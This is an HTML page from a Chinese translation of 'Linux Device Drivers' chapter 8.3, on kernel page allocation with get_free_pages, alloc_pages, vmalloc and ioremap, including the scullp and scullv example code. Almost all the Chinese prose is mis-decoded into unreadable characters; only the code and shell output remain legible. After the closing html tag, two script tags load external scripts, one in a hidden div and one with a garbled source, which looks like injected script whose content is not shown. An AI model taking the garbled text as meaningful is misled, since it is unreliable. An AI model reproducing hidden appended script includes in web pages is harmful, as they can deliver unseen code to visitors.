<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>8.3.&#160;get_free_page -Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch08.html" title="&#160;8&#160;&#160;ڴ">
<link rel="prev" href="ch08s02.html" title="8.2.&#160;󱸻">
<link rel="next" href="ch08s04.html" title="8.4.&#160;ÿ-CPU ı">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">8.3.&#160;get_free_page </th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch08s02.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;8&#160;&#160;ڴ</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch08s04.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="getfreepageandFriends.sect"></a>8.3.&#160;get_free_page </h2></div></div></div>
<p>һģҪڴ, ʹһҳļ. ҳҲŵ,  15 ½.</p>
<p>Ϊҳ, к:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>get_zeroed_page(unsigned int flags);</span></span></dt>
<dd><p>һָҳָ벢˸ҳ.</p></dd>
<dt><span class="term"><span>__get_free_page(unsigned int flags);</span></span></dt>
<dd><p> get_zeroed_page, ûҳ.</p></dd>
<dt><span class="term"><span>__get_free_pages(unsigned int flags, unsigned int order);</span></span></dt>
<dd><p>䲢һָһڴһֽڵָ, ڴǼ()ҳû.</p></dd>
</dl></div>
<p>flags ͬ kmalloc ÷ͬ; ʹ GFP_KERNEL  GFP_ATOMIC, ܴ __GFP_DMA ־(  ISA DMA ڴ )  __GFP_HIGHMEM ʹø߶ڴʱ. <sup>[<a name="id451239" href="#ftn.id451239">29</a>]</sup>order Ļͷŵҳ 2 Ϊ׵Ķ(, log2N). , Ҫһҳ order Ϊ 0,  8 ҳ 3.  order ̫(ûǸС), ҳʧ. get_order , ʹһ, һ size ȡ order( 2 )ƽ̨. order ֵ 10  11 (Ӧ 1024  2048 ҳ), ϵ. , һ order-10 ķڳһոкܶڴϵͳгɹĻС.</p>
<p>, /proc/buddyinfo ϵͳÿڴеÿ order жٿ.</p>
<p>һЩҳ, ʹк֮һͷ. һһصڶĺ:</p>
<pre class="programlisting">
void free_page(unsigned long addr);
void free_pages(unsigned long addr, unsigned long order);
</pre>
<p>ͼͷźҳͬҳ, ڴͼ, ϵͳںʱ鷳.</p>
<p>ֵǿһ, __get_free_pages ĺκʱ, ѭǿ kmalloc ͬ. ЩĳЩ·ڴ, رʹ GFP_ATOMIC ʱ. , Щ亯ĳ׼ʧ.</p>
<p> kmalloc( GFP_KERNEL )ʱʧܵûпڴʱ, ں˾. , ̫ͨڴ潵ϵͳӦ. , ͨһ scull 豸ʹػ; ϵͳʼеͼܶڴ kmalloc . ΪÿԴڱ豸ʳ, ܿͱ˵޷; , һ½ͼ.  scull , Ϊֻһģ鲢ҲһķûϵͳĹ. ΪһԱ, С, ΪһģȨ벢ҿϵͳпµİȫ©(һܾ©ո.)</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="AscullUsingWholePagesscullp.sect"></a>8.3.1.&#160;һʹҳ scull: scullp</h3></div></div></div>
<p>Ϊʵزҳ, Ӵ뷢 scullp ģ. һ򻯵 scull, ǰܹ scullc.</p>
<p>scullp ڴҳҳ: scullp_order ȱʡ 0, ǿڱʱı.</p>
<p>дʾηڴ:</p>
<pre class="programlisting">
/* Here's the allocation of a single quantum */
if (!dptr-&gt;data[s_pos])
{
        dptr-&gt;data[s_pos] =
                (void *)__get_free_pages(GFP_KERNEL, dptr-&gt;order);
        if (!dptr-&gt;data[s_pos])
                goto nomem;
        memset(dptr-&gt;data[s_pos], 0, PAGE_SIZE &lt;&lt; dptr-&gt;order);
}
</pre>
<p>scullp ͷڴĴ뿴:</p>
<pre class="programlisting">
/* This code frees a whole quantum-set */
for (i = 0; i &lt; qset; i++)
        if (dptr-&gt;data[i])
                free_pages((unsigned long)(dptr-&gt;data[i]), dptr-&gt;order);
</pre>
<p>û, оҪһٶߺ͸õڴʹ, ΪûڲڴƬ. һЩԴ scull0  4 MB  scull1, ҽŴ scullp0  scullp1; ʾں˿ռ䴦ʹ΢.</p>
<p>߲ܵǼĵ, Ϊ kmalloc Ϊ. ҳҪʵϲٶ, ǸЧڴʹ. ҳ䲻˷ڴ, ʹ kmalloc ڷȻ˷޷Ԥڴ.</p>
<p> __get_free_page ǻõҳȫ, , , ͨʵҳЩҳΪһԵ. , һû mmap Ϊϵҳõڴ.  15 ֲ, չʾ scullp ṩڴӳ, һЩ scull ޷ṩĶ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TheallocpagesInterface.sect"></a>8.3.2.&#160;alloc_pages ӿ</h3></div></div></div>
<p>Ϊ, ǽһڴĽӿ, ǲ׼ʹֱ 15 . , ܹ˵ struct page һһڴҳڲں˽ṹ. ͬǽ, ںطбҪʹҳṹ; رõ, κܴ߶ڴ, ߶ڴں˿ռûһַ.</p>
<p>Linux ҳһΪ alloc_pages_node ĺ:</p>
<pre class="programlisting">
struct page *alloc_pages_node(int nid, unsigned int flags,
 unsigned int order);
</pre>
<p>ҳ 2 (Ǽ򵥵ĺ); õİ汾:</p>
<pre class="programlisting">
struct page *alloc_pages(unsigned int flags, unsigned int order);
struct page *alloc_page(unsigned int flags);
</pre>
<p>ĺ, alloc_pages_node, ʹ 3 , nid Ҫڴ NUMA ڵ ID<sup>[<a name="id451473" href="#ftn.id451473">30</a>]</sup>, flags ͨ GFP_ ־, Լ order ǷĴС. ֵһָڴĵһ()ҳṹָ, , 糣, NULL ʧʱ.</p>
<p>alloc_pages , ͨڵǰ NUMA ڵڴ( ʹ numa_node_id ķֵΪ nid  alloc_pages_node). , Ȼ, alloc_pages ʡ order ҷһҳ. </p>
<p>Ϊͷַʽҳ, Ӧʹһ:</p>
<pre class="programlisting">
void __free_page(struct page *page);
void __free_pages(struct page *page, unsigned int order);
void free_hot_page(struct page *page);
void free_cold_page(struct page *page);
</pre>
<p>һҳǷפڴʶ, Ӧʹ free_hot_page (ڻפҳ)  free_cold_page ֪ͨں. ϢڴϵͳŻڴʹ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="vallocandFriends.sect"></a>8.3.3.&#160;vmalloc  </h3></div></div></div>
<p>չʾһڴ亯 vmlloc, ڴռһڴ. Щҳڴв (ʹһĶ alloc_page ĵÿҳ), ں˿ΪһһĵַΧ. vmalloc  0 ( NULL ַ ) һ, , һָһСΪ size ڴ.</p>
<p> vmalloc Ϊһ Linux ڴ. Ӧע, , vmalloc ʹڴ󲿷².  vmalloc õڴ΢ЧЩ, , ĳЩϵ,  vmalloc ĵַռС. ʹ vmalloc Ĵύںпܻܵ. , Ӧֱʹõҳͼʹ vmalloc .</p>
<p>ǿ vmalloc ι. ԭͺصĶ(ioremap, ϸزһ亯, ڱں):</p>
<pre class="programlisting">
#include &lt;linux/vmalloc.h&gt; 
void *vmalloc(unsigned long size);
void vfree(void * addr);
void *ioremap(unsigned long offset, unsigned long size);
void iounmap(void * addr);
</pre>
<p>ֵǿ kmalloc  _get_free_pages صڴַҲַ. ǵʵֵѰַַǰȻ MMU (ڴԪ,  CPU һ).<sup>[<a name="id451605" href="#ftn.id451605">31</a>]</sup> vmalloc ʹӲûвͬ, ͬںνз.</p>
<p>kmalloc  __get_free_pages ʹõ()ַΧһһһӳ䵽ڴ, λһ PAGE_OFFSET ֵ; ЩҪַΧ޸ҳ. vmalloc  ioremap ʹõĵַΧ, һ, ȫغϳɵ, ÿ佨()ڴ, ͨʵҳ.</p>
<p>ͨȽϷ亯صָ֪. һЩƽ̨(, x86), vmalloc صĵַֻԶ kmalloc ʹõĵַ. ƽ̨(, MIPS, IA-64, Լ x86_64 ), һȫͬĵַΧ.  vmalloc õĵַڴ VMALLOC_START  VAMLLOC_END ķΧ. 2 Ŷ &lt;asm/patable.h&gt; .</p>
<p>vmalloc ĵַ΢֮, Ϊֻڴ MMU ֮ϲ. һҪһַ(һ DMA ַ, Ӳϵͳ), ޷ʹ vmalloc.  vmalloc ȷʱǵΪһֻе˳򻺳ڴʱ. Ҫע vamlloc  __get_free_pages и࿪, Ϊȡڴ沢ҽҳ. ,  vmalloc һҳ.</p>
<p>ںʹ vmalloc һӺ create_module ϵͳ, ʹ vmalloc Ϊڴģÿռ. ģĴ֮󱻿Ŀռ, ʹ copy_from_user. ʽ, ģ鿴Ǽصڴ. ֤, ͬ /proc/kallsyms, ģں˷λһͬںķŵڴ淶Χ.</p>
<p>ʹ vmalloc ڴ vfree ͷ, ú kfree ͷ kmalloc ڴͬʽ.</p>
<p>ͬ vmalloc, ioremap ҳ; ͬ vmalloc, , ʵϲκڴ. ioremap ķֵһַȡضַΧ; õַӦͨ iounmap ͷ.</p>
<p>ioremap ӳһ PCI ()ַ()ں˿ռǷǳõ. , ȡһ PCI Ƶ豸֡; Ļ峣ӳڸ߶ַ, ںʱҳĵַΧ֮. PCI  12 ϸ.</p>
<p>ڿֲ, ֵע㲻ӦֱӴȡ ioremap صĵַڴָ.Ӧһֱʹ readb  ڵ 9 ½ܵ I/O . ҪΪһЩƽ̨,  Alpha, ޷ֱӳ PCI ڴַռ,  PCI  Alpha ֮δͷĲͬ.</p>
<p>ioremap  vmalloc ҳ(ͨ޸ҳ); , طĻ߷ĴСҳ߽. ioremap ģһǶӳͨ"µ"ӳĵַԼͨصһӳҳڵƫ.</p>
<p>vmalloc һСȱ޷ԭʹ, Ϊ, ڲ, ʹ kmalloc(GFP_KERNEL) ȡҳĴ洢, ˿˯. ⲻӦһ --  __get_free_page ʹöһжϴ㹻, ҪһЩ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="AscullUsingVirtualAddressesscullv.sect"></a>8.3.4.&#160;һʹַ scull : scullv</h3></div></div></div>
<p>ʹ vmalloc Ӵ scullv ģṩ. ͬ scullp, ģһ scull ļ򻯰汾, ʹһͬķ亯Ϊ豸洢ݻÿռ.</p>
<p>ģڴһ 16 ҳ. Դ鷽ʽñ scullp õ, չʾһЩʹ似ҪܳʱĶǿе. ʹ __get_free_pages һҳʧܵ, Ҿɹ, . ͬǰ, vmalloc ڷ伸ҳʱ, ǵȡҳʱЩ, ΪҳĿ. scullv  scullp һ. order ָÿ""ȱʡΪ 4. scullv  scullp ֮λڲͬڷ. Щʹ vmalloc ڴ:</p>
<pre class="programlisting">
/* Allocate a quantum using virtual addresses */
if (!dptr-&gt;data[s_pos])
{
        dptr-&gt;data[s_pos] =
                (void *)vmalloc(PAGE_SIZE &lt;&lt; dptr-&gt;order);
        if (!dptr-&gt;data[s_pos])
                goto nomem;
        memset(dptr-&gt;data[s_pos], 0, PAGE_SIZE &lt;&lt; dptr-&gt;order);
}
</pre>
<p>ԼЩͷڴ:</p>
<pre class="programlisting">
/* Release the quantum-set */
for (i = 0; i &lt; qset; i++)
        if (dptr-&gt;data[i])
                vfree(dptr-&gt;data[i]);
</pre>
<p>ʹܵԵ± 2 ģ, ܿǵݷͨȡ /proc ļ. մһ x86_64 ϵͳϻ:</p>
<pre class="screen">
salma% cat /tmp/bigfile &gt; /dev/scullp0; head -5 /proc/scullpmem
Device 0: qset 500, order 0, sz 1535135

item at 000001001847da58, qset at 000001001db4c000
0:1001db56000
1:1003d1c7000
salma% cat /tmp/bigfile &gt; /dev/scullv0; head -5 /proc/scullvmem
Device 0: qset 500, order 4, sz 1535135
item at 000001001847da58, qset at 0000010013dea000
0:ffffff0001177000
1:ffffff0001188000
</pre>
<p>, ෴,  x86 ϵͳ:</p>
<pre class="screen">
rudo% cat /tmp/bigfile &gt; /dev/scullp0; head -5 /proc/scullpmem
Device 0: qset 500, order 0, sz 1535135
item at ccf80e00, qset at cf7b9800
0:ccc58000
1:cccdd000
rudo% cat /tmp/bigfile &gt; /dev/scullv0; head -5 /proc/scullvmem
Device 0: qset 500, order 4, sz 1535135
item at cfab4800, qset at cf8e4000
0:d087a000
1:d08d2000
</pre>
<p>Щֵʾ 2 ͬΪ.  x86_64, ַַȫӳ䵽ͬĵַΧ( 0x100  0xffffff00),  x86 , vmalloc ַַֻʹõӳ֮.</p>
</div>
<div class="footnotes">
<br><hr width="100" align="left">
<div class="footnote"><p><sup>[<a name="ftn.id451239" href="#id451239">29</a>] </sup> alloc_pages (Ժ)Ӧ߶ڴҳ, ĳЩֱ 15 ²漰.</p></div>
<div class="footnote"><p><sup>[<a name="ftn.id451473" href="#id451473">30</a>] </sup>NUMA (ͳһڴȡ) Ƕദϵͳ, ڴضĴ("ڵ")"ֲ". ԾֲڴĴȡȴȡǾֲڴ. ϵͳ, ڵǰڵڴҪ. ͨص NUMA , .</p></div>
<div class="footnote"><p><sup>[<a name="ftn.id451605" href="#id451605">31</a>] </sup>ʵ, һЩϵṹ""ַΪѰַڴ. , Linux ں,  kernel  __get_free_pages ַλЩַΧеһ. 豸ĲֱӰڴںϵͳеĴ͸</p></div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch08s02.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch08.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch08s04.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">8.2.&#160;󱸻&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;8.4.&#160;ÿ-CPU ı</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>